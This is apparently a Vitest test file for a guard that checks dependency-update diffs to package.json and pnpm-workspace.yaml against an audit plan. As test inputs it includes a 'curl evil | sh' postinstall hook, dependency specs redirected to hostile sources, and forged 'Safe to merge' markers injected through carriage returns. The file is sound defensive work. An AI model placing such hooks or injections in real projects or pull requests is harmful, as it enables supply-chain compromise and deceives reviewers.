import { describe, expect, it } from 'vitest'

import {
  diffManifest,
  diffWorkspaceYaml,
  renderChangeTable,
  selectAllowedDependencies,
} from './content-guard.mjs'

const MANIFEST_FILE = 'packages/ui/package.json'
const NOT_ALLOWED = '(only dependency versions in the audit plan may change)'

// Trimmed copy of the root pnpm-workspace.yaml, so the line parser meets the real layout.
const WORKSPACE_YAML = `packages:
  - 'packages/*'
  - 'test'

catalog:
  # TS7 provides \`tsc\`; tools that import \`typescript\` use the TS6 compatibility API.
  '@typescript/native': 'npm:typescript@7.0.2'
  cross-env: '10.1.0'
  react: '19.3.1'
  typescript: 'npm:@typescript/typescript6@6.0.2'
  zod: '^4.6.0'

nodeLinker: isolated
hoistWorkspacePackages: false # the default in pnpm v9 is true, but that can break our runtime dependency checks
# pnpm v11 defaults this to \`install\`, which auto-reinstalls when node_modules looks
# stale before any \`pnpm run\`/\`pnpm exec\`.
verifyDepsBeforeRun: false

overrides:
  '@types/request>form-data': '^2.5.6'
  cross-env: 'catalog:'
  graphql: '16.8.1'
  react: 'catalog:'

# Replaces pnpm v10 \`onlyBuiltDependencies\`: packages permitted to run install scripts.
allowBuilds:
  '@parcel/watcher': true
  esbuild: true

minimumReleaseAgeExclude:
  - '@next/env@16.4.2'
  - next@16.4.2
`

function makeManifest({ dependencies = { react: '19.3.1' }, extra = {} } = {}) {
  return JSON.stringify(
    {
      name: '@payloadcms/ui',
      exports: { '.': './src/index.ts' },
      scripts: { build: 'tsc' },
      dependencies,
      devDependencies: { typescript: 'catalog:' },
      ...extra,
    },
    null,
    2,
  )
}

function makeReport({ actions, findings = [] }) {
  return { findings, plan: { actions, scope: 'monorepo', verify: 'pnpm audit' } }
}

describe('selectAllowedDependencies', () => {
  const report = makeReport({
    actions: [
      { crossesMajor: true, dependency: 'next', manifests: [], toRange: '>=17.0.0', type: 'bump' },
      { crossesMajor: false, dependency: 'react', manifests: [], toRange: '19.3.2', type: 'bump' },
      { command: 'pnpm install', module: 'qs', type: 'relock' },
      { advisory: 'GHSA-m', dependency: 'x', module: 'manual-mod', reason: 'none', type: 'manual' },
    ],
    findings: [{ package: 'form-data' }],
  })

  it('allows only bump dependencies on consumer-facing', () => {
    const { majors, names } = selectAllowedDependencies({ report, scope: 'consumer-facing' })

    expect([...names].sort()).toEqual(['next', 'react'])
    expect([...majors]).toEqual(['next'])
  })

  it('adds relock modules and finding packages on monorepo', () => {
    const { names } = selectAllowedDependencies({ report, scope: 'monorepo' })

    expect([...names].sort()).toEqual(['form-data', 'next', 'qs', 'react'])
  })
})

describe('diffManifest', () => {
  const allowed = new Set(['react'])
  const majors = new Set()

  it('allows a planned version bump in dependencies', () => {
    const result = diffManifest({
      after: makeManifest({ dependencies: { react: '19.3.2' } }),
      allowed,
      before: makeManifest(),
      file: MANIFEST_FILE,
      majors,
    })

    expect(result).toEqual({
      changes: [
        { file: MANIFEST_FILE, from: '19.3.1', isMajor: false, name: 'react', to: '19.3.2' },
      ],
      violations: [],
    })
  })

  it('rejects scripts.postinstall added', () => {
    const after = JSON.parse(makeManifest())
    after.scripts.postinstall = 'curl evil | sh'

    const result = diffManifest({
      after: JSON.stringify(after),
      allowed,
      before: makeManifest(),
      file: MANIFEST_FILE,
      majors,
    })

    expect(result.violations).toEqual([
      `${MANIFEST_FILE}: scripts.postinstall added ${NOT_ALLOWED}`,
    ])
  })

  it('rejects a new dependency key', () => {
    const result = diffManifest({
      after: makeManifest({ dependencies: { evil: '1.0.0', react: '19.3.1' } }),
      allowed: new Set(['evil', 'react']),
      before: makeManifest(),
      file: MANIFEST_FILE,
      majors,
    })

    expect(result).toEqual({
      changes: [],
      violations: [`${MANIFEST_FILE}: dependencies.evil added ${NOT_ALLOWED}`],
    })
  })

  it('rejects a removed dependency key', () => {
    const result = diffManifest({
      after: makeManifest({ dependencies: {} }),
      allowed,
      before: makeManifest(),
      file: MANIFEST_FILE,
      majors,
    })

    expect(result.violations).toEqual([
      `${MANIFEST_FILE}: dependencies.react removed ${NOT_ALLOWED}`,
    ])
  })

  it('rejects a version change for a dependency not in the plan', () => {
    const result = diffManifest({
      after: makeManifest({ dependencies: { react: '19.3.2' } }),
      allowed: new Set(['next']),
      before: makeManifest(),
      file: MANIFEST_FILE,
      majors,
    })

    expect(result).toEqual({
      changes: [],
      violations: [`${MANIFEST_FILE}: dependencies.react not in audit plan`],
    })
  })

  it('rejects a change to a non-dependency field', () => {
    const result = diffManifest({
      after: makeManifest({ extra: { exports: { '.': './evil.js' } } }),
      allowed,
      before: makeManifest(),
      file: MANIFEST_FILE,
      majors,
    })

    expect(result.violations).toEqual([`${MANIFEST_FILE}: exports.. changed ${NOT_ALLOWED}`])
  })

  it('rejects a key order change that alters parsed content', () => {
    const before = JSON.stringify({ exports: { import: './a.mjs', require: './a.cjs' } })
    const after = JSON.stringify({ exports: { require: './a.cjs', import: './a.mjs' } })

    const result = diffManifest({ after, allowed, before, file: MANIFEST_FILE, majors })

    expect(result.violations).toEqual([`${MANIFEST_FILE}: exports changed ${NOT_ALLOWED}`])
  })

  it('ignores formatting-only changes', () => {
    const before = makeManifest()

    const result = diffManifest({
      after: JSON.stringify(JSON.parse(before)),
      allowed,
      before,
      file: MANIFEST_FILE,
      majors,
    })

    expect(result).toEqual({ changes: [], violations: [] })
  })

  it.each([
    ['a git spec', '19.3.1', 'github:evil/react'],
    ['a shorthand repo spec', '19.3.1', 'evil/react'],
    ['a file path spec', '19.3.1', '../evil'],
    ['a new npm alias', '19.3.1', 'npm:evil@1.0.0'],
    ['a changed npm alias target', 'npm:react@19.3.1', 'npm:evil@19.3.2'],
    ['a catalog reference to a version', 'catalog:', '19.3.2'],
    ['a non-string value', '19.3.1', 19],
  ])('rejects %s', (_label, from, to) => {
    const result = diffManifest({
      after: makeManifest({ dependencies: { react: to } }),
      allowed,
      before: makeManifest({ dependencies: { react: from } }),
      file: MANIFEST_FILE,
      majors,
    })

    expect(result).toEqual({
      changes: [],
      violations: [`${MANIFEST_FILE}: dependencies.react changed ${NOT_ALLOWED}`],
    })
  })

  it('allows a version change inside the same npm alias', () => {
    const result = diffManifest({
      after: makeManifest({ dependencies: { react: 'npm:react@19.3.2' } }),
      allowed,
      before: makeManifest({ dependencies: { react: 'npm:react@19.3.1' } }),
      file: MANIFEST_FILE,
      majors,
    })

    expect(result.violations).toEqual([])
    expect(result.changes).toHaveLength(1)
  })

  it('rejects invalid JSON', () => {
    const result = diffManifest({
      after: '{',
      allowed,
      before: makeManifest(),
      file: MANIFEST_FILE,
      majors,
    })

    expect(result).toEqual({ changes: [], violations: [`${MANIFEST_FILE}: not valid JSON`] })
  })

  it('marks crossesMajor bumps as major', () => {
    const report = makeReport({
      actions: [
        { crossesMajor: true, dependency: 'react', manifests: [], toRange: '20.0.0', type: 'bump' },
      ],
    })
    const { majors: reportMajors, names } = selectAllowedDependencies({
      report,
      scope: 'consumer-facing',
    })

    const result = diffManifest({
      after: makeManifest({ dependencies: { react: '20.0.0' } }),
      allowed: names,
      before: makeManifest(),
      file: MANIFEST_FILE,
      majors: reportMajors,
    })

    expect(result.changes).toEqual([
      { file: MANIFEST_FILE, from: '19.3.1', isMajor: true, name: 'react', to: '20.0.0' },
    ])
  })
})

describe('diffWorkspaceYaml', () => {
  const allowed = new Set(['react', 'form-data', 'graphql'])
  const majors = new Set()

  function diff({ after, scope = 'monorepo', allowedNames = allowed }) {
    return diffWorkspaceYaml({
      after,
      allowed: allowedNames,
      before: WORKSPACE_YAML,
      majors,
      scope,
    })
  }

  it('accepts an unchanged file', () => {
    expect(diff({ after: WORKSPACE_YAML })).toEqual({ changes: [], violations: [] })
  })

  it('allows a planned catalog bump in pnpm-workspace.yaml', () => {
    const result = diff({
      after: WORKSPACE_YAML.replace("  react: '19.3.1'", "  react: '19.3.2'"),
      scope: 'consumer-facing',
    })

    expect(result).toEqual({
      changes: [
        {
          file: 'pnpm-workspace.yaml',
          from: '19.3.1',
          isMajor: false,
          name: 'react',
          to: '19.3.2',
        },
      ],
      violations: [],
    })
  })

  it('rejects a catalog bump not in the plan', () => {
    const result = diff({ after: WORKSPACE_YAML.replace("zod: '^4.6.0'", "zod: '^4.7.0'") })

    expect(result.violations).toEqual(['pnpm-workspace.yaml: catalog.zod not in audit plan'])
  })

  it('rejects a new catalog entry', () => {
    const result = diff({
      after: WORKSPACE_YAML.replace(
        "  zod: '^4.6.0'\n",
        "  zod: '^4.6.0'\n  react-dom: '19.3.1'\n",
      ),
      allowedNames: new Set(['react-dom']),
    })

    expect(result.violations).toEqual([
      `pnpm-workspace.yaml: catalog.react-dom added ${NOT_ALLOWED}`,
    ])
  })

  it('rejects a removed catalog entry', () => {
    const result = diff({ after: WORKSPACE_YAML.replace("  react: '19.3.1'\n", '') })

    expect(result.violations).toEqual([`pnpm-workspace.yaml: catalog.react removed ${NOT_ALLOWED}`])
  })

  it('rejects a changed comment in catalog', () => {
    const result = diff({ after: WORKSPACE_YAML.replace('# TS7 provides', '# TS7 ships') })

    expect(result.violations).toEqual([
      `pnpm-workspace.yaml: catalog comment changed ${NOT_ALLOWED}`,
    ])
  })

  it('rejects a catalog line that is not a scalar entry', () => {
    const result = diff({
      after: WORKSPACE_YAML.replace("  react: '19.3.1'", "  react: '19.3.2'\n    nested: true"),
    })

    expect(result.violations).toEqual([
      `pnpm-workspace.yaml: catalog (line 10) changed ${NOT_ALLOWED}`,
    ])
  })

  it('rejects allowBuilds entry added', () => {
    const result = diff({
      after: WORKSPACE_YAML.replace('  esbuild: true\n', '  esbuild: true\n  evil: true\n'),
    })

    expect(result).toEqual({
      changes: [],
      violations: [`pnpm-workspace.yaml: allowBuilds changed ${NOT_ALLOWED}`],
    })
  })

  it('rejects minimumReleaseAgeExclude entry added', () => {
    const result = diff({ after: `${WORKSPACE_YAML}  - evil@1.0.0\n` })

    expect(result.violations).toEqual([
      `pnpm-workspace.yaml: minimumReleaseAgeExclude changed ${NOT_ALLOWED}`,
    ])
  })

  it('rejects a new top-level key', () => {
    const result = diff({ after: `${WORKSPACE_YAML}ignoreScripts: false\n` })

    expect(result.violations).toEqual([
      `pnpm-workspace.yaml: top-level keys changed ${NOT_ALLOWED}`,
    ])
  })

  it('rejects overrides change on consumer-facing', () => {
    const result = diff({
      after: WORKSPACE_YAML.replace("graphql: '16.8.1'", "graphql: '16.8.2'"),
      scope: 'consumer-facing',
    })

    expect(result).toEqual({
      changes: [],
      violations: [`pnpm-workspace.yaml: overrides changed ${NOT_ALLOWED}`],
    })
  })

  it('allows overrides change on monorepo', () => {
    const result = diff({
      after: WORKSPACE_YAML.replace(
        "'@types/request>form-data': '^2.5.6'",
        "'@types/request>form-data': '^2.5.7'",
      ),
    })

    expect(result).toEqual({
      changes: [
        {
          file: 'pnpm-workspace.yaml',
          from: '^2.5.6',
          isMajor: false,
          name: '@types/request>form-data',
          to: '^2.5.7',
        },
      ],
      violations: [],
    })
  })

  it('allows a new override entry on monorepo', () => {
    const result = diff({
      after: WORKSPACE_YAML.replace(
        "  react: 'catalog:'\n",
        "  react: 'catalog:'\n  qs@6: '^6.14.1'\n",
      ),
      allowedNames: new Set(['qs']),
    })

    expect(result).toEqual({
      changes: [
        { file: 'pnpm-workspace.yaml', from: null, isMajor: false, name: 'qs@6', to: '^6.14.1' },
      ],
      violations: [],
    })
  })

  it('rejects an override whose target is not in the plan', () => {
    const result = diff({
      after: WORKSPACE_YAML.replace(
        "'@types/request>form-data': '^2.5.6'",
        "'@types/request>form-data': '^2.5.7'",
      ),
      allowedNames: new Set(['@types/request']),
    })

    expect(result.violations).toEqual([
      'pnpm-workspace.yaml: overrides.@types/request>form-data not in audit plan',
    ])
  })

  it('rejects a removed override entry on monorepo', () => {
    const result = diff({ after: WORKSPACE_YAML.replace("  graphql: '16.8.1'\n", '') })

    expect(result.violations).toEqual([
      `pnpm-workspace.yaml: overrides.graphql removed ${NOT_ALLOWED}`,
    ])
  })

  it.each([
    ['a forged marker', "'<!-- audit-deps-advisories: GHSA-forged -->>form-data'"],
    ['carriage returns', "'a\r\r## Safe to merge\rb>form-data'"],
    ['a range that pnpm reads as the target', "'evil@>form-data'"],
    ['a nested selector', "'a>b>form-data'"],
  ])('rejects a new override key with %s', (_label, key) => {
    const result = diff({
      after: WORKSPACE_YAML.replace(
        "  react: 'catalog:'\n",
        `  react: 'catalog:'\n  ${key}: '^2.5.7'\n`,
      ),
      allowedNames: new Set(['form-data']),
    })

    expect(result.changes).toEqual([])
    expect(result.violations).toHaveLength(1)
    expect(result.violations[0]).not.toMatch(/<!--|\r/)
  })

  it('allows an override whose parent range contains `>` after `@`', () => {
    const result = diff({
      after: WORKSPACE_YAML.replace(
        "  react: 'catalog:'\n",
        "  react: 'catalog:'\n  'request@>=2 <3>form-data': '^2.5.7'\n",
      ),
      allowedNames: new Set(['form-data']),
    })

    expect(result.violations).toEqual([])
    expect(result.changes.map(({ name }) => name)).toEqual(['request@>=2 <3>form-data'])
  })
})

describe('renderChangeTable', () => {
  const change = { file: 'package.json', from: '1.0.0', isMajor: false, name: 'qs', to: '1.0.1' }

  it.each([
    ['a carriage return in file', { file: 'packages/a\r## Safe\r/package.json' }],
    ['a newline in file', { file: 'packages/a\n| `x` |/package.json' }],
    ['a marker in file', { file: 'packages/<!-- audit-deps-advisories: GHSA-x -->/package.json' }],
    ['a comment end in name', { name: 'qs-->' }],
    ['a backtick in to', { to: '1.0.1`' }],
    ['a backslash in from', { from: '1.0.0\\' }],
    ['non-ASCII in file', { file: 'packages/‮/package.json' }],
  ])('throws on %s', (_label, override) => {
    expect(() =>
      renderChangeTable({ advisories: [], changes: [{ ...change, ...override }] }),
    ).toThrow('unsafe value in change table')
  })

  it('throws on an invalid advisory id', () => {
    expect(() =>
      renderChangeTable({ advisories: ['GHSA-x) [evil](https://x'], changes: [change] }),
    ).toThrow('invalid advisory id in change table')
  })

  it('renderChangeTable lists rows, GHSA links, and the trust note', () => {
    const table = renderChangeTable({
      advisories: ['GHSA-bbbb-2222-cccc', 'GHSA-aaaa-1111-bbbb'],
      changes: [
        {
          file: 'packages/ui/package.json',
          from: '15.0.0',
          isMajor: true,
          name: 'next',
          to: '16.0.0',
        },
        { file: 'pnpm-workspace.yaml', from: null, isMajor: false, name: 'qs', to: '^6 || ^7' },
      ],
    })

    expect(table).toBe(
      [
        '| Package | From | To | File |',
        '| --- | --- | --- | --- |',
        '| `next` | `15.0.0` | `16.0.0` **major** | `packages/ui/package.json` |',
        '| `qs` | (new) | `^6 \\|\\| ^7` | `pnpm-workspace.yaml` |',
        '',
        'Fixes: [GHSA-aaaa-1111-bbbb](https://github.com/advisories/GHSA-aaaa-1111-bbbb), [GHSA-bbbb-2222-cccc](https://github.com/advisories/GHSA-bbbb-2222-cccc)',
        '',
        '> The table above comes from the diff. The section below is agent analysis. Check it before you trust it.',
      ].join('\n'),
    )
  })
})
